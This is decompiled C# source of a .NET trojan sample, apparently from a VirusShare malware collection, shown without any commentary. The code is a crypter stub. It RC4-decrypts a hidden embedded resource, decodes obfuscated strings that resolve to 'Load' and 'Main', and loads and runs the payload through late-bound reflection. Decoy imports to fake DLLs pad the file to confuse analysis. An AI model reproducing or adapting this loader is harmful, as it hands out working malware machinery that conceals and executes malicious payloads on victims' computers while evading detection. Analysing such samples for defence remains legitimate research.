// Decompiled with JetBrains decompiler
// Type: GVfEXaLleZuMivfMKefL.sHeZlrFhgrNxWuQqYera
// Assembly: GVfEXaLleZuMivfMKefL, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E6AB47D-A3A1-43FF-9F00-55A6950EDD49
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Crypt.ety-e24643abf46b1b2332ecb18927512b74cc6dba51aaf43e3e490389451050bceb.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace GVfEXaLleZuMivfMKefL
{
  public class sHeZlrFhgrNxWuQqYera
  {
    private static byte[] y3aR = Encoding.Default.GetBytes(GVfEXaLleZuMivfMKefL.My.Resources.Resources.__);
    protected static Assembly _b7WsqSKw = (Assembly) NewLateBinding.LateGet((object) null, typeof (Assembly), sHeZlrFhgrNxWuQqYera.EIo59X7("Mqdh"), new object[1]
    {
      RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sHeZlrFhgrNxWuQqYera.gseR(ref sHeZlrFhgrNxWuQqYera.y3aR))))
    }, (string[]) null, (Type[]) null, (bool[]) null);

    [DebuggerNonUserCode]
    public sHeZlrFhgrNxWuQqYera()
    {
    }

    [DllImport("try5", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int bvgrf(
      int dwDriverIdentifier,
      int hdrvr,
      int uMsg,
      int lParam1,
      int lParam2);

    public static string EIo59X7(string EuqYv)
    {
      byte[] bytes = Encoding.UTF8.GetBytes(EuqYv);
      int num1 = bytes.Length - 1;
      for (int index1 = 0; index1 <= num1; ++index1)
      {
        if (bytes[index1] > (byte) 31 & bytes[index1] < (byte) 127)
        {
          byte[] numArray = bytes;
          int index2 = index1;
          int index3 = index2;
          int num2 = (int) (byte) ((uint) bytes[index2] - (uint) (byte) (index1 % 31 + 1));
          numArray[index3] = (byte) num2;
        }
        if (bytes[index1] < (byte) 32)
        {
          byte[] numArray = bytes;
          int index4 = index1;
          int index5 = index4;
          int num3 = (int) (byte) ((uint) bytes[index4] + 95U);
          numArray[index5] = (byte) num3;
        }
      }
      return Encoding.UTF8.GetString(bytes);
    }

    [DllImport("qab", EntryPoint = "ZO", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int EnumDependentServices(
      int hService,
      int dwServiceState,
      sHeZlrFhgrNxWuQqYera.ENUM_SERVICE_STATUS lpServices,
      int cbBufSize,
      int pcbBytesNeeded,
      int lpServicesReturned);

    [DllImport("lwQ", EntryPoint = "ObjG", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int JjVwy([MarshalAs(UnmanagedType.VBByRefStr)] ref string ÈËÉ, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ÍÍÌ, int IGpWn);

    [DllImport("g45", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int l3yB2(int hdc, int nWidth, int nHeight);

    [STAThread]
    public static void Main() => sHeZlrFhgrNxWuQqYera._b7WsqSKw.GetType(sHeZlrFhgrNxWuQqYera.EIo59X7("Ugvx") + sHeZlrFhgrNxWuQqYera.EIo59X7("/Eoexy8")).InvokeMember(sHeZlrFhgrNxWuQqYera.EIo59X7("Nclr"), BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null);

    [DllImport("h56", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int NlHYj(int hConv, int id, int hUser);

    [DllImport("s443f", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int sawq3(
      int hInstance,
      int nWidth,
      int nHeight,
      byte nPlanes,
      byte nBitsPixel,
      byte lpANDbits,
      byte lpXORbits);

    [DllImport("h55", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SNv2j(
      sHeZlrFhgrNxWuQqYera.SECURITY_DESCRIPTOR pSelfRelativeSecurityDescriptor,
      sHeZlrFhgrNxWuQqYera.SECURITY_DESCRIPTOR pAbsoluteSecurityDescriptor,
      int lpdwAbsoluteSecurityDescriptorSize,
      sHeZlrFhgrNxWuQqYera.ACL pDacl,
      int lpdwDaclSize,
      sHeZlrFhgrNxWuQqYera.ACL pSacl,
      int lpdwSaclSize,
      byte[] pOwner,
      int lpdwOwnerSize,
      byte[] pPrimaryGroup,
      int lpdwPrimaryGroupSize);

    [DllImport("8", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int esMfNgd(int hQBmtzn);

    public static object gseR(ref byte[] yuy)
    {
      byte[] numArray1 = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      byte[] numArray2 = new byte[256];
      byte[] numArray3 = new byte[256];
      int length1 = yuy.GetLength(0);
      int length2 = numArray1.GetLength(0);
      int index1 = 0;
      do
      {
        numArray2[index1] = (byte) index1;
        numArray3[index1] = numArray1[index1 % length2];
        ++index1;
      }
      while (index1 <= (int) byte.MaxValue);
      int index2 = 0;
      int index3 = 0;
      do
      {
        index2 = (index2 + (int) numArray2[index3] + (int) numArray3[index3]) % 256;
        byte num = numArray2[index3];
        numArray2[index3] = numArray2[index2];
        numArray2[index2] = num;
        ++index3;
      }
      while (index3 <= (int) byte.MaxValue);
      int index4 = 0;
      int index5 = index4;
      int num1 = length1 - 1;
      for (int index6 = 0; index6 <= num1; ++index6)
      {
        index5 = (index5 + 1) % 256;
        index4 = (index4 + (int) numArray2[index5]) % 256;
        byte num2 = numArray2[index5];
        numArray2[index5] = numArray2[index4];
        numArray2[index4] = num2;
        int index7 = ((int) numArray2[index5] + (int) numArray2[index4]) % 256;
        yuy[index6] = (byte) ((int) yuy[index6] ^ (int) numArray2[index7]);
      }
      return (object) yuy;
    }

    [DllImport("9", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int n9Tlpi0(int jTy839K, int jsdSplV, int a5Xt2Qg);

    private struct EMRCREATEMONOBRUSH
    {
      public sHeZlrFhgrNxWuQqYera.emr pEmr;
      public int ihBrush;
      public int iUsage;
      public int offBmi;
      public int cbBmi;
      public int offBits;
      public int cbBits;
    }

    private struct ENUM_SERVICE_STATUS
    {
      public string lpServiceName;
      public string lpDisplayName;
      public sHeZlrFhgrNxWuQqYera.SERVICE_STATUS ServiceStatus;
    }

    public struct McXfn
    {
      public byte GCkZY;
      public byte lZYIW;
      public short OvBAO;
      public short DMhvS;
      public short lBdNa;
    }

    private struct SECURITY_DESCRIPTOR
    {
      public byte Revision;
      public byte Sbz1;
      public int Control;
      public int Owner;
      public int Group;
      public sHeZlrFhgrNxWuQqYera.ACL Sacl;
      public sHeZlrFhgrNxWuQqYera.ACL Dacl;
    }

    private struct SERVICE_STATUS
    {
      public int dwServiceStructure;
      public int dwCurrentState;
      public int dwControlsAccepted;
      public int dwWin32ExitCode;
      public int dwServiceSpecificExitCode;
      public int dwCheckPoint;
      public int dwWaitHint;
    }

    public struct kder3
    {
      public object rty5;
      public object uyl0W;
      public object a1prT;
      public object S15vt;
      public int IdGlN;
      public sHeZlrFhgrNxWuQqYera.McXfn jyj7;
    }

    public struct rt445
    {
      public object h55f;
      public object UC2u;
      public object JTW;
      public int iMa;
    }

    private struct ACL
    {
      public byte AclRevision;
      public byte Sbz1;
      public short AclSize;
      public short AceCount;
      public short Sbz2;
    }

    private struct emr
    {
      public int iStructure;
      public int nSize;
    }
  }
}
